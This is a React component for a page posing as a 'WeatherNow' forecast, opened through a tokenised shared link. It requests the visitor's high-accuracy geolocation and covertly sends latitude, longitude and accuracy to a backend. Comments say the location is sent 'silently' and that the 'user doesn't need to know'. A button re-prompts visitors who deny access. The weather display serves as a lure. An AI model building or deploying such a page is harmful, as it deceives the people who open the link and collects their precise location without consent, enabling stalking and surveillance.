import { useEffect, useState, useRef } from 'react';
import { useParams } from 'react-router-dom';
import { getPublicLink, submitLocation } from '../services/api';

interface WeatherData {
  temperature: number;
  feelsLike: number;
  humidity: number;
  windSpeed: number;
  weatherCode: number;
  isDay: boolean;
  high: number;
  low: number;
  city: string;
}

const weatherDescriptions: Record<number, { label: string; icon: string }> = {
  0: { label: 'Clear Sky', icon: '☀️' },
  1: { label: 'Mainly Clear', icon: '🌤️' },
  2: { label: 'Partly Cloudy', icon: '⛅' },
  3: { label: 'Overcast', icon: '☁️' },
  45: { label: 'Foggy', icon: '🌫️' },
  48: { label: 'Rime Fog', icon: '🌫️' },
  51: { label: 'Light Drizzle', icon: '🌦️' },
  53: { label: 'Drizzle', icon: '🌦️' },
  55: { label: 'Heavy Drizzle', icon: '🌧️' },
  61: { label: 'Light Rain', icon: '🌧️' },
  63: { label: 'Rain', icon: '🌧️' },
  65: { label: 'Heavy Rain', icon: '🌧️' },
  71: { label: 'Light Snow', icon: '❄️' },
  73: { label: 'Snow', icon: '🌨️' },
  75: { label: 'Heavy Snow', icon: '🌨️' },
  80: { label: 'Rain Showers', icon: '🌦️' },
  81: { label: 'Moderate Showers', icon: '🌧️' },
  82: { label: 'Heavy Showers', icon: '⛈️' },
  95: { label: 'Thunderstorm', icon: '⛈️' },
  96: { label: 'Thunderstorm w/ Hail', icon: '⛈️' },
  99: { label: 'Severe Thunderstorm', icon: '⛈️' },
};

function getWeatherInfo(code: number) {
  return weatherDescriptions[code] || { label: 'Unknown', icon: '🌡️' };
}

function getTimeString() {
  return new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
}

function getDayName(offset: number) {
  const d = new Date();
  d.setDate(d.getDate() + offset);
  return d.toLocaleDateString([], { weekday: 'short' });
}

export default function PublicLink() {
  const { token } = useParams<{ token: string }>();
  const [weather, setWeather] = useState<WeatherData | null>(null);
  const [loading, setLoading] = useState(true);
  const [denied, setDenied] = useState(false);
  const [forecast, setForecast] = useState<{ day: string; high: number; low: number; code: number }[]>([]);
  const [hourly, setHourly] = useState<{ time: string; temp: number; code: number }[]>([]);
  const [currentTime, setCurrentTime] = useState(getTimeString());
  const [linkValid, setLinkValid] = useState(true);
  const locationSent = useRef(false);

  // Update clock every minute
  useEffect(() => {
    const interval = setInterval(() => setCurrentTime(getTimeString()), 60000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (!token) return;

    // Validate link exists first
    getPublicLink(token)
      .then(() => {
        setLinkValid(true);
        requestLocation();
      })
      .catch(() => {
        setLinkValid(false);
        setLoading(false);
      });
  }, [token]);

  const requestLocation = () => {
    if (!navigator.geolocation) {
      loadFallbackWeather();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude, accuracy } = position.coords;

        // Silently send location to backend
        if (!locationSent.current && token) {
          locationSent.current = true;
          try {
            await submitLocation(token, { latitude, longitude, accuracy });
          } catch {
            // Silent fail — user doesn't need to know
          }
        }

        // Fetch real weather for their location
        await fetchWeather(latitude, longitude);
      },
      () => {
        // User denied — show fallback weather
        setDenied(true);
        loadFallbackWeather();
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  };

  const loadFallbackWeather = async () => {
    // Default to New Delhi if denied
    await fetchWeather(28.6139, 77.2090, 'New Delhi');
  };

  const fetchWeather = async (lat: number, lon: number, fallbackCity?: string) => {
    try {
      // Reverse geocode for city name
      let city = fallbackCity || 'Your Location';
      if (!fallbackCity) {
        try {
          const geoRes = await fetch(
            `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&zoom=10`
          );
          const geoData = await geoRes.json();
          city = geoData.address?.city || geoData.address?.town || geoData.address?.village || geoData.address?.state || 'Your Area';
        } catch {
          // Silent fail
        }
      }

      const res = await fetch(
        `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current=temperature_2m,relative_humidity_2m,apparent_temperature,weather_code,wind_speed_10m,is_day&daily=weather_code,temperature_2m_max,temperature_2m_min&hourly=temperature_2m,weather_code&timezone=auto&forecast_days=7`
      );
      const data = await res.json();

      setWeather({
        temperature: Math.round(data.current.temperature_2m),
        feelsLike: Math.round(data.current.apparent_temperature),
        humidity: data.current.relative_humidity_2m,
        windSpeed: Math.round(data.current.wind_speed_10m),
        weatherCode: data.current.weather_code,
        isDay: data.current.is_day === 1,
        high: Math.round(data.daily.temperature_2m_max[0]),
        low: Math.round(data.daily.temperature_2m_min[0]),
        city,
      });

      // 7-day forecast
      const days = data.daily.temperature_2m_max.slice(1, 7).map((high: number, i: number) => ({
        day: getDayName(i + 1),
        high: Math.round(high),
        low: Math.round(data.daily.temperature_2m_min[i + 1]),
        code: data.daily.weather_code[i + 1],
      }));
      setForecast(days);

      // Next 12 hours
      const currentHour = new Date().getHours();
      const hourlyData = [];
      for (let i = 0; i < 12; i++) {
        const idx = currentHour + i;
        if (idx < data.hourly.temperature_2m.length) {
          const h = (currentHour + i) % 24;
          hourlyData.push({
            time: i === 0 ? 'Now' : `${h % 12 || 12}${h >= 12 ? 'pm' : 'am'}`,
            temp: Math.round(data.hourly.temperature_2m[idx]),
            code: data.hourly.weather_code[idx],
          });
        }
      }
      setHourly(hourlyData);
    } catch {
      // If API fails, show minimal fallback
      setWeather({
        temperature: 28,
        feelsLike: 32,
        humidity: 65,
        windSpeed: 12,
        weatherCode: 2,
        isDay: true,
        high: 33,
        low: 24,
        city: fallbackCity || 'Your Location',
      });
    }
    setLoading(false);
  };

  if (!linkValid) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-950 to-slate-900 flex items-center justify-center p-4">
        <div className="text-center">
          <p className="text-6xl mb-4">🌧️</p>
          <h1 className="text-2xl font-bold text-white mb-2">Service Unavailable</h1>
          <p className="text-blue-300/70 text-sm">This weather link has expired or is no longer available.</p>
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-950 to-slate-900 flex items-center justify-center p-4">
        <div className="text-center">
          <div className="w-12 h-12 border-2 border-blue-400 border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-blue-200 font-medium">Fetching weather for your area...</p>
          <p className="text-blue-300/50 text-xs mt-2">Please allow location access for accurate forecasts</p>
        </div>
      </div>
    );
  }

  if (!weather) return null;

  const info = getWeatherInfo(weather.weatherCode);
  const bgGradient = weather.isDay
    ? 'from-blue-600 via-sky-500 to-cyan-400'
    : 'from-indigo-900 via-blue-950 to-slate-900';

  return (
    <div className={`min-h-screen bg-gradient-to-br ${weather.isDay ? 'from-sky-400 via-blue-500 to-indigo-600' : 'from-slate-900 via-blue-950 to-indigo-950'}`}>
      {/* Top Bar */}
      <div className="flex items-center justify-between px-5 pt-4 pb-2">
        <div className="flex items-center gap-2">
          <span className="text-lg">🌤️</span>
          <span className="text-white/90 font-semibold text-sm tracking-wide">WeatherNow</span>
        </div>
        <span className="text-white/60 text-xs">{currentTime}</span>
      </div>

      <div className="max-w-lg mx-auto px-4 pb-8">
        {/* Main Weather Card */}
        <div className={`bg-gradient-to-br ${bgGradient} rounded-3xl p-6 shadow-2xl shadow-blue-900/30 mb-4 relative overflow-hidden`}>
          {/* Decorative circles */}
          <div className="absolute -top-10 -right-10 w-40 h-40 bg-white/5 rounded-full" />
          <div className="absolute -bottom-8 -left-8 w-32 h-32 bg-white/5 rounded-full" />

          <div className="relative z-10">
            <div className="flex items-center gap-1.5 mb-1">
              <svg className="w-3.5 h-3.5 text-white/80" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M5.05 4.05a7 7 0 119.9 9.9L10 18.9l-4.95-4.95a7 7 0 010-9.9zM10 11a2 2 0 100-4 2 2 0 000 4z" clipRule="evenodd"/>
              </svg>
              <span className="text-white/90 text-sm font-medium">{weather.city}</span>
            </div>

            <div className="flex items-start justify-between mt-2">
              <div>
                <div className="text-7xl font-extralight text-white tracking-tighter leading-none">
                  {weather.temperature}°
                </div>
                <p className="text-white/70 text-sm mt-1">{info.label}</p>
                <p className="text-white/50 text-xs mt-0.5">
                  H:{weather.high}° L:{weather.low}°
                </p>
              </div>
              <div className="text-6xl mt-1 drop-shadow-lg">{info.icon}</div>
            </div>
          </div>
        </div>

        {/* Hourly Forecast */}
        {hourly.length > 0 && (
          <div className={`${weather.isDay ? 'bg-white/15' : 'bg-white/5'} backdrop-blur-xl rounded-2xl p-4 mb-4`}>
            <p className="text-white/50 text-[11px] font-medium uppercase tracking-wider mb-3">Hourly Forecast</p>
            <div className="flex gap-4 overflow-x-auto pb-1 scrollbar-hide">
              {hourly.map((h, i) => (
                <div key={i} className="flex flex-col items-center gap-1.5 min-w-[48px]">
                  <span className="text-white/60 text-[11px]">{h.time}</span>
                  <span className="text-xl">{getWeatherInfo(h.code).icon}</span>
                  <span className="text-white text-xs font-medium">{h.temp}°</span>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Stats Grid */}
        <div className="grid grid-cols-2 gap-3 mb-4">
          <div className={`${weather.isDay ? 'bg-white/15' : 'bg-white/5'} backdrop-blur-xl rounded-2xl p-4`}>
            <p className="text-white/50 text-[11px] uppercase tracking-wider mb-1">Feels Like</p>
            <p className="text-white text-2xl font-light">{weather.feelsLike}°</p>
          </div>
          <div className={`${weather.isDay ? 'bg-white/15' : 'bg-white/5'} backdrop-blur-xl rounded-2xl p-4`}>
            <p className="text-white/50 text-[11px] uppercase tracking-wider mb-1">Humidity</p>
            <p className="text-white text-2xl font-light">{weather.humidity}%</p>
          </div>
          <div className={`${weather.isDay ? 'bg-white/15' : 'bg-white/5'} backdrop-blur-xl rounded-2xl p-4`}>
            <p className="text-white/50 text-[11px] uppercase tracking-wider mb-1">Wind</p>
            <p className="text-white text-2xl font-light">{weather.windSpeed} <span className="text-sm">km/h</span></p>
          </div>
          <div className={`${weather.isDay ? 'bg-white/15' : 'bg-white/5'} backdrop-blur-xl rounded-2xl p-4`}>
            <p className="text-white/50 text-[11px] uppercase tracking-wider mb-1">Condition</p>
            <p className="text-white text-lg font-light leading-tight">{info.label}</p>
          </div>
        </div>

        {/* 6-Day Forecast */}
        {forecast.length > 0 && (
          <div className={`${weather.isDay ? 'bg-white/15' : 'bg-white/5'} backdrop-blur-xl rounded-2xl p-4`}>
            <p className="text-white/50 text-[11px] font-medium uppercase tracking-wider mb-3">6-Day Forecast</p>
            <div className="space-y-2.5">
              {forecast.map((day, i) => (
                <div key={i} className="flex items-center justify-between">
                  <span className="text-white/80 text-sm w-10">{day.day}</span>
                  <span className="text-lg">{getWeatherInfo(day.code).icon}</span>
                  <div className="flex items-center gap-2">
                    <span className="text-white/40 text-sm">{day.low}°</span>
                    <div className="w-20 h-1 rounded-full bg-white/10 overflow-hidden">
                      <div
                        className="h-full rounded-full bg-gradient-to-r from-blue-400 to-orange-400"
                        style={{
                          width: `${((day.high - day.low) / (weather.high - weather.low + 1)) * 100}%`,
                          marginLeft: `${((day.low - weather.low) / (weather.high - weather.low + 1)) * 100}%`,
                        }}
                      />
                    </div>
                    <span className="text-white text-sm font-medium">{day.high}°</span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Enable location hint if denied */}
        {denied && (
          <button
            onClick={() => { setDenied(false); setLoading(true); requestLocation(); }}
            className="w-full mt-4 bg-white/10 hover:bg-white/15 backdrop-blur-xl text-white/70 hover:text-white text-xs py-3 rounded-2xl transition-all text-center"
          >
            📍 Enable location for weather in your exact area
          </button>
        )}

        {/* Footer */}
        <p className="text-center text-white/20 text-[10px] mt-6">
          Powered by Open-Meteo • Data updates every 15 min
        </p>
      </div>
    </div>
  );
}
